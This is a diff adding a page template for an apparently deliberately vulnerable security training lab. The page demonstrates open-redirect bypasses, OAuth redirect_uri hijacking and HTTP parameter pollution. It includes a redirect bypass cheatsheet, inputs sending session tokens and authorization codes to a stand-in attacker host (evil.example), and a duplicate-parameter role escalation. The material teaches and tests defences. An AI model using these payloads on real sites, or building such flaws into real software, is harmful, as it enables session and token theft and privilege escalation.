@@ -1,0 +1,155 @@
+{% extends 'base.html' %}
+{% block title %}Open Redirect Lab{% endblock %}
+{% block extra_head %}
+<link rel="stylesheet" href="{{ url_for('static', filename='css/aegis-v22.css') }}">
+{% endblock %}
+{% block content %}
+<div class="pagehead" style="display:flex;align-items:center;gap:14px;margin-bottom:22px;">
+  <img src="{{ url_for('static', filename='img/svg/icon-redirect.svg') }}" width="44" height="44" alt="">
+  <div>
+    <h1 style="margin:0 0 2px;">Redirect & OAuth Lab</h1>
+    <p style="margin:0;color:var(--dim);font-size:13px;">Open redirect bypass techniques · OAuth redirect_uri manipulation · HTTP parameter pollution</p>
+  </div>
+</div>
+
+<div class="grid grid-2" style="gap:18px;margin-bottom:20px;">
+  <!-- Open redirect -->
+  <div class="panel">
+    <h2>Open Redirect <span class="sev p2" style="margin-left:6px;">P2 · CWE-601</span></h2>
+    <p style="font-size:13px;color:var(--dim);">The <code>/auth/redirect?next=</code> endpoint checks that values don't start with <code>http://</code> or <code>https://</code> — but misses protocol-relative (<code>//evil.example</code>), backslash (<code>\evil.example</code>), and encoded variants.</p>
+
+    <div style="margin-bottom:14px;">
+      <label style="font-size:11px;color:var(--dim);display:block;margin-bottom:4px;">Target URL</label>
+      <input id="redirect-target" type="text" value="//evil.example/steal?session="
+             oninput="buildRedirectChain(this.value)"
+             style="width:100%;padding:8px;background:var(--panel-2);border:1px solid var(--hairline);color:var(--text);border-radius:var(--radius);font-family:'JetBrains Mono',monospace;font-size:12px;">
+    </div>
+    <div class="redirect-chain" id="redirect-chain"></div>
+
+    <div style="display:flex;gap:8px;flex-wrap:wrap;margin-top:12px;">
+      <button class="btn small" onclick="testRedirect()">Test redirect →</button>
+      <button class="btn small secondary" onclick="setTarget('//evil.example')">//evil.example</button>
+      <button class="btn small secondary" onclick="setTarget('\\/evil.example')">\\/evil.example</button>
+      <button class="btn small secondary" onclick="setTarget('/dashboard')">safe: /dashboard</button>
+      <button class="btn small secondary" onclick="setTarget('%2F%2Fevil.example')">URL-encoded</button>
+    </div>
+    <pre class="code" id="redirect-out" style="margin-top:10px;display:none;font-size:11px;"></pre>
+    <div style="margin-top:10px;font-size:11px;color:var(--dim);font-family:'JetBrains Mono',monospace;">CWE-601 · URL Redirection to Untrusted Site<br>Fix: allow-list of permitted redirect destinations</div>
+  </div>
+
+  <!-- OAuth redirect_uri -->
+  <div class="panel">
+    <h2>OAuth redirect_uri <span class="sev p2" style="margin-left:6px;">P2 · Unvalidated</span></h2>
+    <p style="font-size:13px;color:var(--dim);">The OAuth callback endpoint accepts any <code>redirect_uri</code> without checking it against a registered allow-list. An attacker steals the authorization code by supplying their own endpoint as the redirect destination.</p>
+
+    <div style="display:flex;flex-direction:column;gap:10px;margin-bottom:14px;">
+      <div>
+        <label style="font-size:11px;color:var(--dim);display:block;margin-bottom:4px;">redirect_uri (not validated)</label>
+        <input id="oauth-uri" type="text" value="https://evil.example/steal"
+               style="width:100%;padding:8px;background:var(--panel-2);border:1px solid var(--hairline);color:var(--text);border-radius:var(--radius);font-family:'JetBrains Mono',monospace;font-size:12px;">
+      </div>
+    </div>
+    <button class="btn small" onclick="testOauth()">Test OAuth Callback →</button>
+    <pre class="code" id="oauth-out" style="margin-top:10px;display:none;font-size:11px;max-height:160px;overflow-y:auto;"></pre>
+    <div style="margin-top:10px;font-size:11px;color:var(--dim);font-family:'JetBrains Mono',monospace;">CWE-601 · OAuth redirect_uri not validated against registered list<br>Impact: auth code / access token theft</div>
+  </div>
+</div>
+
+<!-- HTTP Parameter Pollution -->
+<div class="panel" style="margin-bottom:18px;">
+  <h2>HTTP Parameter Pollution <span class="sev p2" style="margin-left:6px;">P2 · CWE-235</span></h2>
+  <div class="grid grid-2" style="gap:16px;">
+    <div>
+      <p style="font-size:13px;color:var(--dim);">The <code>/api/v6/param-pollution</code> endpoint uses <code>request.args.get("role")</code> for the auth check (returns first value) but business logic uses the <em>last</em> duplicate value — allowing auth bypass with <code>?role=crew&amp;role=admin</code>.</p>
+      <div style="display:flex;flex-direction:column;gap:8px;margin-top:12px;">
+        <button class="btn small" onclick="testHpp('crew')">Normal: ?role=crew → 403</button>
+        <button class="btn small secondary" onclick="testHppDupe()">HPP: ?role=crew&amp;role=admin → 200</button>
+        <button class="btn small secondary" onclick="testHpp('admin')">Direct: ?role=admin → 200</button>
+      </div>
+      <pre class="code" id="hpp-out" style="margin-top:10px;display:none;font-size:11px;"></pre>
+    </div>
+    <div>
+      <p style="font-size:12px;color:var(--dim);margin-bottom:10px;">Why this works:</p>
+      <pre class="code" style="font-size:11px;"># Flask behaviour with duplicates:
+# ?role=crew&role=admin
+
+request.args.get("role")
+# → "crew"  (first value, used for auth check)
+
+request.args.getlist("role")[-1]
+# → "admin" (last value, used for business logic)
+
+# Auth check passes "crew" → not blocked
+# Logic grants "admin" access → bypass</pre>
+      <div style="margin-top:10px;font-size:11px;color:var(--dim);font-family:'JetBrains Mono',monospace;">CWE-235 · Improper Handling of Extra Parameters<br>Impact: role escalation via duplicate params</div>
+    </div>
+  </div>
+</div>
+
+<!-- Bypass reference table -->
+<div class="panel">
+  <h2>Redirect Bypass Cheatsheet</h2>
+  <table style="width:100%;border-collapse:collapse;font-size:12px;font-family:'JetBrains Mono',monospace;">
+    <thead>
+      <tr style="background:var(--panel-2);">
+        <th style="padding:8px 12px;text-align:left;border-bottom:1px solid var(--hairline);font-size:10px;letter-spacing:.06em;color:var(--dim);">PAYLOAD</th>
+        <th style="padding:8px 12px;text-align:left;border-bottom:1px solid var(--hairline);font-size:10px;letter-spacing:.06em;color:var(--dim);">TECHNIQUE</th>
+        <th style="padding:8px 12px;text-align:left;border-bottom:1px solid var(--hairline);font-size:10px;letter-spacing:.06em;color:var(--dim);">BLOCKED BY CHECK</th>
+        <th style="padding:8px 12px;text-align:left;border-bottom:1px solid var(--hairline);font-size:10px;letter-spacing:.06em;color:var(--dim);">TEST</th>
+      </tr>
+    </thead>
+    <tbody>
+      {% for row in [
+        ('//evil.example','Protocol-relative','http:// check only','testRedirectRow'),
+        ('\\/evil.example','Backslash protocol-relative','No','testRedirectRow2'),
+        ('%2F%2Fevil.example','URL-encoded //','No','testRedirectRow3'),
+        ('/\\evil.example','Forwardslash+backslash','No','testRedirectRow4'),
+        ('https://aegis.internal@evil.example','Userinfo','No','testRedirectRow5'),
+      ] %}
+      <tr style="border-bottom:1px solid rgba(35,43,61,.5);">
+        <td style="padding:8px 12px;color:var(--danger);">{{ row[0] }}</td>
+        <td style="padding:8px 12px;color:var(--dim);">{{ row[1] }}</td>
+        <td style="padding:8px 12px;color:{{ 'var(--cyan)' if row[2]=='http:// check only' else 'var(--danger)' }};">{{ row[2] }}</td>
+        <td style="padding:8px 12px;">
+          <a href="{{ url_for('auth_open_redirect') }}?next={{ row[0] | urlencode }}" class="btn small secondary" target="_blank" style="font-size:10px;">Test →</a>
+        </td>
+      </tr>
+      {% endfor %}
+    </tbody>
+  </table>
+</div>
+
+<script src="{{ url_for('static', filename='js/aegis-v22.js') }}"></script>
+<script>
+document.addEventListener('DOMContentLoaded', () => buildRedirectChain('//evil.example/steal?session='));
+
+function setTarget(t){ document.getElementById('redirect-target').value=t; buildRedirectChain(t); }
+
+async function testRedirect(){
+  const t = document.getElementById('redirect-target').value;
+  const out = document.getElementById('redirect-out');
+  out.style.display='block'; out.textContent='Sending…';
+  const r = await fetch('/auth/redirect?next='+encodeURIComponent(t),{redirect:'manual'});
+  out.textContent=`HTTP ${r.status}\nLocation: ${r.headers.get('location')||'(no redirect)'}\n\nNote: browser follows redirect automatically; in real attack victim lands on external site.`;
+}
+async function testOauth(){
+  const uri = document.getElementById('oauth-uri').value;
+  const out = document.getElementById('oauth-out');
+  out.style.display='block'; out.textContent='Sending…';
+  const r = await fetch('/oauth/callback?code=demo-auth-code&redirect_uri='+encodeURIComponent(uri));
+  out.textContent=`HTTP ${r.status}\n\n`+JSON.stringify(await r.json(),null,2);
+}
+async function testHpp(role){
+  const out=document.getElementById('hpp-out');
+  out.style.display='block'; out.textContent='Sending…';
+  const r=await fetch(`/api/v6/param-pollution?role=${encodeURIComponent(role)}`);
+  out.textContent=`?role=${role} → HTTP ${r.status}\n\n`+JSON.stringify(await r.json(),null,2);
+}
+async function testHppDupe(){
+  const out=document.getElementById('hpp-out');
+  out.style.display='block'; out.textContent='Sending…';
+  const r=await fetch('/api/v6/param-pollution?role=crew&role=admin');
+  out.textContent=`?role=crew&role=admin → HTTP ${r.status}\n\n`+JSON.stringify(await r.json(),null,2);
+}
+</script>
+{% endblock %}
